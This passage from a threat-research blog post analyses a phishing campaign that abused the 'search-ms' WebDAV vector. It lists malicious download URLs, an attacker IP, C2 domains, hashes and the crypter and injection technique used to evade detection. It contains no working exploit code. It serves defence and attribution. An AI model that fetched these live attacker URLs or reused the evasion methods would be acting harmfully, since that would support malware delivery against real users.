srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GFtbwtoJ3STVtn-smfpLsg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*GFtbwtoJ3STVtn-smfpLsg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*GFtbwtoJ3STVtn-smfpLsg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*GFtbwtoJ3STVtn-smfpLsg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*GFtbwtoJ3STVtn-smfpLsg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*GFtbwtoJ3STVtn-smfpLsg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*GFtbwtoJ3STVtn-smfpLsg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*GFtbwtoJ3STVtn-smfpLsg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="459" loading="eager" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 3: Execution Flow ITW attack</figcaption></figure><p id="0fc5" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, the attack is pretty much the same as we have just learned about. An invoice-themed phishing mail was received by one of the company&#x27;s employees. A malicious PDF file was attached, showing a typical lure of a “protected document” that contains a link to view the alleged content. The lure can be seen below:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi pw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wR3GVrY_2FGEpkQF-5nwag.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*wR3GVrY_2FGEpkQF-5nwag.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wR3GVrY_2FGEpkQF-5nwag.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wR3GVrY_2FGEpkQF-5nwag.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wR3GVrY_2FGEpkQF-5nwag.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wR3GVrY_2FGEpkQF-5nwag.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wR3GVrY_2FGEpkQF-5nwag.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*wR3GVrY_2FGEpkQF-5nwag.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="399" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 4: Lure Invoice.pdf with link to “search-ms” redirect</figcaption></figure><p id="fa2b" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As the filters of the attacked network prevented execution, I was not able to obtain the final payload. However, we will later see what it would likely have been.</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="f913" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk">Chapter 3: Investigating Attackers Infrastructure</h2><p id="8efd" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">After confirming that we had observed an in-the-wild attack using the new “search-ms” attack vector described by Trellix, I was of course curious to see which actor had picked up the method that fast. I was sure it must be a sophisticated actor as you don’t normally see actors adapting so fast. So I started to dig into their infrastructure. A first hint that there was more to find was shared by my fellow researcher <a class="af ok" href="https://twitter.com/AnFam17" rel="noopener ugc nofollow" target="_blank">RussianPanda</a>:</p><figure class="ol om on oo op pk"><div class="px py l fj"><div class="pz qa l"></div></div></figure><p id="a526" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, there are many further associated paths and files to the WebDav Server used by our attacker. Panda was so kind to share the associated dll’s with me. And indeed, they turned out to be XWorm.</p><p id="7c7a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Associated C2s:</p><ul class=""><li id="07cb" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd qb pa pb bk">secoundxwormm.ddns[.]net</li><li id="b296" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk">freshinxworm.ddns[.]net</li></ul><p id="a539" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">The use of dynamic DNS domains for C2 communications is a central technique in the arsenal of the DDGroup actor. We are going to have a thorough look at the network indicators related to this actor in a later part of this blog post.</p><p id="fc12" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">However, I would like to point out another interesting detail:</p><p id="92bf" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">WebDav Environments as used in this attack can actually be queried as well. If you skip the predetermined search term (Invoice-xyz), you actually get all files currently available on the WebDav Server. So when revisiting the server&#x27;s IP on 09.08.2023, the Invoice files of the before-described attack were already gone. However, there were the following files available:</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yKw4yeOU7oyuQjNrCqAV0A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*yKw4yeOU7oyuQjNrCqAV0A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*yKw4yeOU7oyuQjNrCqAV0A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*yKw4yeOU7oyuQjNrCqAV0A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*yKw4yeOU7oyuQjNrCqAV0A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*yKw4yeOU7oyuQjNrCqAV0A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*yKw4yeOU7oyuQjNrCqAV0A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*yKw4yeOU7oyuQjNrCqAV0A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="145" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 5: Files available (via Explorer.exe)</figcaption></figure><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qd"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XumnohGTwVpcvzJUoJfaQQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XumnohGTwVpcvzJUoJfaQQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XumnohGTwVpcvzJUoJfaQQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XumnohGTwVpcvzJUoJfaQQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XumnohGTwVpcvzJUoJfaQQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XumnohGTwVpcvzJUoJfaQQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XumnohGTwVpcvzJUoJfaQQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*XumnohGTwVpcvzJUoJfaQQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="232" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 6: Files available (via Chrome)</figcaption></figure><p id="197d" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As you can see, there was yet another .dll file, which turned out to be AsyncRAT.</p><p id="6285" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Associated C2 domains:</p><ul class=""><li id="9631" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd qb pa pb bk">Darwin090.gleeze[.]com</li><li id="8e94" class="mg mh gu mi b mj pc ml mm mn pd mp mq mr pe mt mu mv pf mx my mz pg nb nc nd qb pa pb bk">randall010.camdvr[.]org</li></ul><p id="1947" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Note: Both camdvr and gleeze are dynamic DNS domains by a DNS provider called <a class="af ok" href="https://dynu.com" rel="noopener ugc nofollow" target="_blank">Dynu Systems, Inc</a>.</p><p id="bb8a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">However, what may be even more interesting is the “server.exe” file with the SHA-256 hash: ad91669c04a71d1adedd3800fcfb505734e442a891a532e1ad18c54b05acc98d</p><figure class="ol om on oo op pk ph pi paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qe"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_i2F0vHumOLH0Kp8QGgB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*_i2F0vHumOLH0Kp8QGgB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*_i2F0vHumOLH0Kp8QGgB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*_i2F0vHumOLH0Kp8QGgB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*_i2F0vHumOLH0Kp8QGgB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*_i2F0vHumOLH0Kp8QGgB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*_i2F0vHumOLH0Kp8QGgB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*_i2F0vHumOLH0Kp8QGgB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln pp c" width="700" height="395" loading="lazy" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 7: server.exe executed in Sandbox</figcaption></figure><p id="5b40" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">If you enter this hash into the search function of VirusTotal, you will see that this file has previously been submitted as dufs.exe.</p><p id="ac66" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">A little Google investigation later, we can identify the application as an open-source file-sharing server from GitHub: <a class="af ok" href="https://github.com/sigoden/dufs" rel="noopener ugc nofollow" target="_blank">https://github.com/sigoden/dufs</a>.</p><p id="7c24" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Among the multiple functionalities of this server is the WebDAV protocol. It is therefore very likely we have found the software used for setting up the attacker&#x27;s WebDAV environment.</p><p id="9e57" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">In addition, when I first stumbled upon the server, there was a digital breadcrumb left which led me to another WebDAV server by this attacker:<br/>http://192.155.91[.]72:5000/dufs.exe.</p><p id="b1ac" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">When looking at that IP in Virustotal, we can yet again make out associated files. They make use of the same “Invoice” related scheme. One of these files is Invoice_RVSJKAM02GH_pdf.lnk with the sha-256 hash: 84d32881ef43a7662841c032d263478fb93c5bac82a126a0d06daf685ad7fa3c.</p><p id="75bb" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">It downloads a file called: http://192.155.91.72:5000/Invoice.vbs which in turn downloads a .jpeg file from https://cdn.pixelbin[.]io/v2/red-wildflower-1b0af4/original/universo_vbs.jpeg . Sadly, the image file was not available anymore. However, the Invoice.vbs file actually hints that it would have contained code to decrypt yet another payload sitting at https://winyardbuilding[.]nz/B/1vcf.txt. It is assumed that ultimately the final payload would likely have been yet another piece of off-the-shelf malware with dynamic DNS C2. We will have a look at further network indicators in a later chapter. However, before doing so, let&#x27;s have a look at the previously discovered payloads of XWorm and AsyncRAT.</p></div></div></div><div class="ab cb ne nf ng nh" role="separator"><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk nl"></span><span class="ni by bm nj nk"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="3031" class="nm nn gu bf no np nq dy nr ns nt ea nu mr nv nw nx mv ny nz oa mz ob oc od oe bk"><strong class="al">Chapter 4: The Unknown Crypter</strong></h2><p id="a461" class="pw-post-body-paragraph mg mh gu mi b mj of ml mm mn og mp mq mr oh mt mu mv oi mx my mz oj nb nc nd gn bk">When first analyzing the payloads used in the WebDAV attacks described in Chapters 2 and 3, an unknown Crypter was observed. While Payloads like XWorm and AsyncRAT are normally well-known and therefore well covered by common detection tools and online sandboxes, the DLL files in this attack only got a 3/10 rating in the online sandbox service tria.ge with successful executions going as low as 1/10 detection rate as seen in the following analysis: <a class="af ok" href="https://tria.ge/230807-zbx56shc85/behavioral2" rel="noopener ugc nofollow" target="_blank">https://tria.ge/230807-zbx56shc85/behavioral2</a></p><p id="a242" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">The detection service Intezer did not perform any better and was not able to name/identify XWorm as such (although generic malware was successfully detected): <a class="af ok" href="https://analyze.intezer.com/analyses/efa9bcff-0f2a-4805-8761-56b8c7024a1b/genetic-analysis" rel="noopener ugc nofollow" target="_blank">https://analyze.intezer.com/analyses/efa9bcff-0f2a-4805-8761-56b8c7024a1b/genetic-analysis</a></p><p id="7473" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">So I had a closer look at the binaries. The first thing I did was look at the strings extracted by Intezer:</p></div></div><div class="pk"><div class="ab cb"><div class="li qf lj qg lk qh cf qi cg qj ci bh"><figure class="ol om on oo op pk ql qm paragraph-image"><div role="button" tabindex="0" class="pl pm fj pn bh po"><div class="ph pi qk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jVeYPerz3zDEsqr3s9SZxA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jVeYPerz3zDEsqr3s9SZxA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jVeYPerz3zDEsqr3s9SZxA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jVeYPerz3zDEsqr3s9SZxA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jVeYPerz3zDEsqr3s9SZxA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jVeYPerz3zDEsqr3s9SZxA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jVeYPerz3zDEsqr3s9SZxA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*jVeYPerz3zDEsqr3s9SZxA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh ln pp c" width="1000" height="295" loading="eager" role="presentation"/></picture></div></div><figcaption class="pq ff pr ph pi ps pt bf b bg z du">Figure 8: Some of the extracted strings</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="c257" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">When looking at the extracted strings, two things immediately stick out.</p><p id="b11d" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">First of all, we seem to be dealing with a binary written in the RUST programming language, which is identifiable by the .rs files being imported. It is an interesting choice because RUST has been increasingly used by malware authors to evade Antivirus and Malware Detection solutions due to it being less used for malware creation than older languages like C# or C++. It also makes reversing harder as there are fewer talented reverse engineers for programming languages with lesser use.</p><p id="9a73" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Additionally, we can see that there is actually a PDB path inside the binary:</p><p id="417b" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">“C:\Users\Administrator\Desktop\crock\target\release\deps\crock.pdb”</p><p id="fff2" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">However, as much as I searched for this pdb path, I was not able to find any mention of it. Which is normally not common as the average criminal mostly opts for off-the-shelf encryptors. The only reason that seemed legitimate to me was that I was looking at a previously undocumented crypter, maybe even something self-coded by the actor.</p><p id="1429" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Of course, this possibility was very intriguing, as it was going in contrary to all prior observations concerning the use of off-the-shelf malware, dynamic DNS C2s, and open-source tools like the Dufs file-sharing server.</p><p id="aa9c" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">At this time, I sent off another Tweet:</p><figure class="ol om on oo op pk"><div class="px py l fj"><div class="pz qa l"></div></div></figure><p id="2923" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Sometimes you just have to admit that your capabilities are not sufficient in a certain area and I am definitely not an expert reverse engineer and even less so in the RUST language.</p><p id="2d0a" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">As a response to this tweet, I was contacted by a fellow researcher who goes by the handle <a class="af ok" href="https://twitter.com/cxiao__" rel="noopener ugc nofollow" target="_blank">cxiao</a>. Cxiao was quick to point out that he was surprised that the online scanning services had done such a poor job in detecting the threat as the obfuscator actually did a straightforward process injection into the default Windows editor “notepad.exe”.</p><p id="be03" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">Cxiao was also able to point me toward the likely used crypter/packer for this malware. And guess what? It is open source again: <a class="af ok" href="https://github.com/optiv/Freeze.rs" rel="noopener ugc nofollow" target="_blank">https://github.com/optiv/Freeze.rs</a></p><p id="f09e" class="pw-post-body-paragraph mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd gn bk">While we were not able to prove it without doubt, the following technical details make me confident in this assessment:</p><ol class=""><li id="6330" class="mg mh gu mi b mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd oz pa pb bk">The targeted process for injection is “notepad.exe”, which in the Freeze.rs code is the default process to be targeted.</li><li id="0aac" class="mg mh gu mi b mj pc ml mm mn 